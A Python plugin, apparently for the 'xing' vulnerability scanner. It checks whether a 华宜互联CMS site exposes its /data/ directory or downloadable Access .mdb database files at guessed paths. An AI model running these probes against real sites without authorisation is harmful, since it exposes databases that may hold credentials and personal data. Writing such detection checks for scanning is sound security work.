from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType
import requests

class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "华宜互联CMS 敏感目录泄露"
        self.app_name = '华宜互联CMS'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        base_url = target.rstrip('/')

        # 尝试访问 /data/ 目录
        data_url = base_url + '/data/'
        try:
            resp = requests.get(data_url, timeout=10, verify=False)
            if resp.status_code == 200 and '.mdb' in resp.text.lower():
                self.logger.info("发现华宜互联CMS 敏感目录泄露 (包含 .mdb 文件)")
                return data_url
        except Exception:
            pass

        # 直接尝试常见的 .mdb 文件名（如果目录列表未开启）
        mdb_names = [
            '/data/%23%40liangdian_data.mdb',  # #@liangdian_data.mdb URL编码
            '/data/liangdian_data.mdb',
            '/data/data.mdb',
            '/data/database.mdb',
            '/data/db.mdb',
            '/data/backup.mdb',
        ]
        for mdb_path in mdb_names:
            test_url = base_url + mdb_path
            try:
                resp = requests.get(test_url, timeout=10, verify=False)
                if resp.status_code == 200:
                    # 检查是否为 Access 数据库文件头
                    if resp.content[:4] == b'\x00\x01\x00\x00' or 'Standard Jet DB' in resp.text[:50]:
                        self.logger.info("发现华宜互联CMS 敏感数据库文件可下载")
                        return test_url
            except Exception:
                continue

        return None